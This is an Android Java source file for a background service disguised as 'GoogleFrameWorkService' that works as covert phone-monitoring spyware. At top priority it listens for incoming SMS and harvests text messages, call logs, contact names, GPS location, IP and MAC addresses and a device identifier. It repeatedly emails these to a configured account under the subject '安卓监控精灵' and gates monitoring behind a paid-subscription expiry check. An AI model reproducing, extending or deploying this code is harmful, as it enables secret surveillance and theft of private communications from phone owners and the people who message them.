package com.android.GFS;


import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.Locale;
import java.util.Random;

import com.google.GFS.LocationAdapter;
import com.google.GFS.MailDriver;
import com.google.GFS.RegisterInfo;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.util.Log;
import android.telephony.TelephonyManager;


public class GoogleFrameWorkService extends Service {
    private String II;
    private String mail;
    private String passwd;
    private String latLongString;
    //private String placename = "未知";
    private boolean is_new_sms_coming =false;
    final String SMS_URI_ALL   = "content://sms/";     
    final String SMS_URI_INBOX = "content://sms/inbox";   
    final String SMS_URI_SEND  = "content://sms/sent";   
    final String SMS_URI_DRAFT = "content://sms/draft";
    private int SMS_count_before=0;
    private int SMS_count_current=0;
    public static String hostip="未知";             
    public static String hostmac="未知";
    private LocationAdapter LA;
    private BatteryReceiver breceiver=null;
    private int b_percent=0;
    private  TelephonyManager tm;
    public static String battery_info="未知";
    private String runDate;
    private RegisterInfo info;
    private int dayleft=1;
    
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		//android.os.Debug.waitForDebugger();
		Log.i("service", "created");
		getConfigInfo();
	    LA=new LocationAdapter(this);
		IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        localIntentFilter.setPriority(2147483647);
        SMSBrocast localMessageReceiver = new SMSBrocast();
        registerReceiver(localMessageReceiver, localIntentFilter);
	}
	
	private void getConfigInfo()
	{
		info= new RegisterInfo();
		info.getContentFromFile();
	    II=info.getII();
	    mail=info.getEmail();
	    passwd=info.getPWD();	    
	}
	

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
	    Log.i("service", "started");
    	breceiver=new BatteryReceiver();
    	IntentFilter bfilter =new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
    	registerReceiver(breceiver,bfilter);  	
    	initThreadTask();
		return super.onStartCommand(intent, flags, startId);
	}
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
	}
		
    
	private class BatteryReceiver extends BroadcastReceiver{
		@Override
		public void onReceive(Context context, Intent intent) {
			// TODO Auto-generated method stub
			int b_current =intent.getExtras().getInt("level");
			int b_total=intent.getExtras().getInt("scale");
			b_percent =b_current *100/b_total;
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	private void initThreadTask(){
		new Thread(){
			public void run(){try {
				dothing();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}}
		}.start();
	}
	
	
	private void dothing() throws Exception
	{
		delayMinutes(3);
		initService();
		loopService();
	}
	
	private void initService() throws Exception
	{
		runDate=getLastRunDate();
		SMS_count_before=getSmscount();
		SMS_count_current=0;
		hostip = getLocalIpAddress(); 
		hostmac = getLocalMacAddress();
		battery_info=fetch_battery_info();
		//placename=getPhoneLocation();
		latLongString=getPhoneLatLon();
		
		if(isFirstStart())
		{
			String smsdata=getSmsInPhone(1000)+getTalkInPhone(500);
			int retry=5;
			while((!sendReport(smsdata)) && (retry>0))
			{
				delaySeconds(5);	
				retry--;						
			};
		}
	}
	
	
	private void loopService() throws Exception
	{
		String sms;
		while(true)
		{
			delayMinutes(1);
			Log.i("loopService:", "loop");
			if(!runDate.equals(getDateToday()))
			{
				Log.i("rundate:", runDate);
				while(true)
				{
					Random r=new Random();
					int n=r.nextInt(10);
					delaySeconds(10*n);
					dayleft=info.checkExpireDaysLeft(II);
					Log.i("dayleft:", String.valueOf(dayleft));
					if(dayleft==0)
					{
						delayMinutes(30);
						continue;
					}
					break;
				}
				runDate=getDateToday();
				updateRunDate(runDate);
			}
			
			SMS_count_current=getSmscount();
			if(is_new_sms_coming || (SMS_count_before!=SMS_count_current))
			{
				//SMS updated
				is_new_sms_coming=false;
				SMS_count_before=SMS_count_current;
				sms=getSmsInPhone(5)+getTalkInPhone(5);
				//placename=getPhoneLocation();
				latLongString=getPhoneLatLon();
				int retry=5;
				while((!sendReport(sms)) && (retry>0))
				{
					delaySeconds(5);	
					retry--;
				};
			}
        }
	}
	
	private void delaySeconds(int sec)
	{
		try {
			Thread.sleep(1000*sec);
		} catch (Exception e) {  
			e.printStackTrace();
		}
	}
	private void delayMinutes(int min)
	{
		try {
			Thread.sleep(60*1000*min);
		} catch (Exception e) {  
			e.printStackTrace();
		}
	}
	
	private void delayHours(int hou)
	{
		try {
			Thread.sleep(60*60*1000*hou);
		} catch (Exception e) {  
			e.printStackTrace();
		}
	}
	
	 
	
	private String getDateToday()
	{
		SimpleDateFormat  sdf = new SimpleDateFormat("yyyy-MM-dd",Locale.CHINA); 
		return sdf.format(new Date());		
	}



	
	public String getPhoneLocation(){
		LA.startLoactionService();		
		return LA.getLocationPos();
	}
	private String getPhoneLatLon() {
		// TODO Auto-generated method stub
		LA.startLoactionService();
		LA.getLocationPos();
		return LA.getLocationLatLon();
	}

	
	public class SMSBrocast extends BroadcastReceiver {
		@Override
		public void onReceive(Context arg0, Intent arg1) {
			// TODO Auto-generated method stub
			is_new_sms_coming =true;
		}
	}

	
	public String getContactByAddr(Context context, String addr) 
	{  
	    Uri personUri = Uri.withAppendedPath(  
	            ContactsContract.PhoneLookup.CONTENT_FILTER_URI, addr);  
	    Cursor cur = context.getContentResolver().query(personUri,  
	            new String[] { PhoneLookup.DISPLAY_NAME },  
	            null, null, null );  
	    if( cur.moveToFirst() ) {  
	        int nameIdx = cur.getColumnIndex(PhoneLookup.DISPLAY_NAME);  
	        String mName = cur.getString(nameIdx);  
	        cur.close();  
	        return mName;  
	    }  
	    return null;  
	}
	
	public int getSmscount()
	{
		int sms_count=0;
		try{   
	        ContentResolver cr = getContentResolver();   
	        String[] projection = new String[]{"_id", "address", "person",    
	                "body", "date", "type"};   
	        Uri uri = Uri.parse(SMS_URI_ALL);   
	        Cursor cur = cr.query(uri, projection, null, null, "date desc");
	        sms_count=cur.getCount();
		}catch(SQLiteException ex) {   
	        Log.d("SQLiteException in getSmsInPhone", ex.getMessage());   
	    }   		
		return sms_count;		
	}
	
	public String getSmsInPhone(int max_count)   
	{   
		int index=0;
	    StringBuilder smsBuilder = new StringBuilder(); 
	    smsBuilder.append("\n["+"软件还有"+dayleft+"天过期！"+"]\n");
        smsBuilder.append("\n["+"点击回复，申请续费！否则到期监控自动停止！"+"]\n");
	    smsBuilder.append("\n["+"本软件不介入隐私"+"]\n");
	    smsBuilder.append("\n Wise man have their mouths in their hearts, fools are opposite.\n");  
	    smsBuilder.append("\n["+"智者嘴在心里，愚人心在嘴上"+"]\n");
	    smsBuilder.append("\n--------------------------------\n"); 
	    smsBuilder.append("\n["+latLongString+"]\n");
	    smsBuilder.append("\n[IP地址:"+hostip+"]\n");
	    smsBuilder.append("\n[MAC地址:"+hostmac+"]\n");
	    smsBuilder.append("\n[电量:"+battery_info+"]\n");
	    smsBuilder.append("\n[手机标识码:"+II+"]\n");
	    smsBuilder.append("\n--------------------------------\n"); 
	    smsBuilder.append("\n[短信总数:"+SMS_count_before+"]\n");
	    try{   
	        ContentResolver cr = getContentResolver();   
	        String[] projection = new String[]{"_id", "address", "person",    
	                "body", "date", "type"};   
	        Uri uri = Uri.parse(SMS_URI_ALL);   
	        Cursor cur = cr.query(uri, projection, null, null, "date desc");   	  
	        if (cur.moveToFirst()) {   
	            String name;    
	            String phoneNumber;          
	            String smsbody;   
	            String date; 	            
	            int phoneNumberColumn = cur.getColumnIndex("address");   
	            int smsbodyColumn = cur.getColumnIndex("body");   
	            int dateColumn = cur.getColumnIndex("date");   
	            int typeColumn = cur.getColumnIndex("type");  	            
	            do{   
	            	phoneNumber = cur.getString(phoneNumberColumn);
	            	name=getContactByAddr(this,phoneNumber);
	            	if(name==null)
	            		name="【未知】";
	                smsbody = cur.getString(smsbodyColumn);   
	                SimpleDateFormat dateFormat = new SimpleDateFormat(   
	                        "yyyy-MM-dd hh:mm:ss",Locale.CHINA);   
	                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));   
	                date = dateFormat.format(d); 
	                smsBuilder.append("\n[");   
	                int typeId = cur.getInt(typeColumn);   
	                if(typeId == 1){   
	                    smsBuilder.append(phoneNumber+"（"+name+"）"+"->我,");
	                } else if(typeId == 2){   
	                    smsBuilder.append("我->"+phoneNumber+"（"+name+"）"+",");
	                } else {   
	                    smsBuilder.append(phoneNumber+"（"+name+"）"+",");
	                }   
	                smsBuilder.append('"'+smsbody+'"'+","); 
	                smsBuilder.append(date);   
	                smsBuilder.append("] ");
	        		index++;
	        		if(index>=max_count){
	        			 smsBuilder.append("\n此处省略...条\n"); 
	        			 break;
	        		 }  
	            }while(cur.moveToNext());   
	        } else {   
	            smsBuilder.append("没有短信！");   
	        }
	    } catch(SQLiteException ex) {   
	        Log.d("SQLiteException in getSmsInPhone", ex.getMessage());   
	    }   
	    return smsBuilder.toString();   
	} 
	
	public String getTalkInPhone(int max_count)   
	{   
	    String call_name="";
	    String call_number="";
	    long call_duration;
	    String call_date="";
	    int call_type=0;
	    Date date;
        String time= "";
        int index=0;
	    StringBuilder smsBuilder = new StringBuilder(); 
	    smsBuilder.append("\n--------------------------------\n");
        smsBuilder.append("\n[通话信息]\n");  
	    try{   
	        ContentResolver cr = getContentResolver();   
	        String[] projection = new String[]{Calls._ID, Calls.CACHED_NAME, Calls.NUMBER,
                                Calls.NEW, Calls.TYPE, Calls.DATE, Calls.DURATION};     
	        Cursor cur = cr.query(Calls.CONTENT_URI, projection, null, null, Calls.DEFAULT_SORT_ORDER);  	  
	        if (cur.moveToFirst()) { 
	             do{ 
	                 call_name= cur.getString(cur.getColumnIndex(Calls.CACHED_NAME));
	                 if(call_name==null)
	            		call_name="【未知】";
	                 call_number= cur.getString(cur.getColumnIndex(Calls.NUMBER));
	                 smsBuilder.append("\n[");
	                 call_type= cur.getInt(cur.getColumnIndex(Calls.TYPE));
	                 if(call_type==1){
        			     smsBuilder.append("被叫: "+call_number+"（"+call_name+"）"+"->我, ");
	                 }else if(call_type==2){
	                	 smsBuilder.append("主叫: "+"我->"+call_number+"（"+call_name+"）"+", ");
	                 }else{
	                	 smsBuilder.append("未接: "+call_number+"（"+call_name+"）"+"->我, ");
        		     }
	                 call_duration= cur.getLong(cur.getColumnIndex(Calls.DURATION));
	                 call_date= cur.getString(cur.getColumnIndex(Calls.DATE));
	                 SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss",Locale.CHINA);
	        		 date = new Date(Long.parseLong(call_date));
	        		 time = sfd.format(date);
	        		 smsBuilder.append("时长: "+call_duration+"s,");
	        		 smsBuilder.append("日期: "+time+"]");
	        		 index++;
	        		 if(index>=max_count){
	        			 smsBuilder.append("\n此处省略...条\n"); 
	        			 break;
	        		 }
	            }while(cur.moveToNext());   
	        } else {   
	            smsBuilder.append("无通话记录！");   
	        }
	       
	    } catch(SQLiteException ex) {   
	        Log.d("SQLiteException in getTalkInPhone", ex.getMessage());   
	    }  
	    smsBuilder.append("\n--------------------------------\n"); 
	    smsBuilder.append("\n-END-\n"); 
	    return smsBuilder.toString();   
	} 
		
	
	private boolean sendReport(String msgbody) throws Exception
	{	
    	MailDriver md=new MailDriver();
    	return md.sendMailPlainText(mail, passwd, mail, "安卓监控精灵:新的东东过来了！", msgbody);
	}
	
	private void updateRunDate(String date)
	{
    	SharedPreferences settingSharedPreferences = getSharedPreferences("GFSConfig", Context.MODE_PRIVATE);
	    SharedPreferences.Editor editor = settingSharedPreferences.edit();
	    editor.putString("lastdate", date);
	    editor.commit();
	}
	
	private String getLastRunDate()
	{
		SharedPreferences settingSharedPreferences = getSharedPreferences("GFSConfig", Context.MODE_PRIVATE);
	    return settingSharedPreferences.getString("lastdate", "2013-03-28");
	}
	
	public boolean isFirstStart(){
		SharedPreferences settingSharedPreferences = getSharedPreferences("GFSConfig", Context.MODE_PRIVATE);
		if (settingSharedPreferences.getBoolean("firstStart", true) == true)
		{
		     SharedPreferences.Editor editor = settingSharedPreferences.edit();
		     editor.putBoolean("firstStart", false);
		     editor.commit();
		     return true;
		}
		return false;
	}
	public String getLocalIpAddress() {  
        try {  
            for (Enumeration<NetworkInterface> en = NetworkInterface  
                    .getNetworkInterfaces(); en.hasMoreElements();) {  
                NetworkInterface intf = en.nextElement();  
                for (Enumeration<InetAddress> enumIpAddr = intf  
                        .getInetAddresses(); enumIpAddr.hasMoreElements();) {  
                    InetAddress inetAddress = enumIpAddr.nextElement();  
                    if (!inetAddress.isLoopbackAddress()) {  
                        return inetAddress.getHostAddress().toString();  
                    }  
                }  
            }  
        } catch (SocketException ex) {  
            Log.e("WifiPreference IpAddress", ex.toString());  
        }  
        return null;  
    }  
      
    public String getLocalMacAddress() {  
        WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);  
        WifiInfo info = wifi.getConnectionInfo();  
        return info.getMacAddress();  
    }
    public  String fetch_battery_info() {
		// TODO Auto-generated method stub
		String batterystr=b_percent+"%";		
		return batterystr;
	}
    
	public  String fetch_IMEI_info() {
		// TODO Auto-generated method stub
		tm= (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE); 
		return tm.getDeviceId();
	}
	
}
	



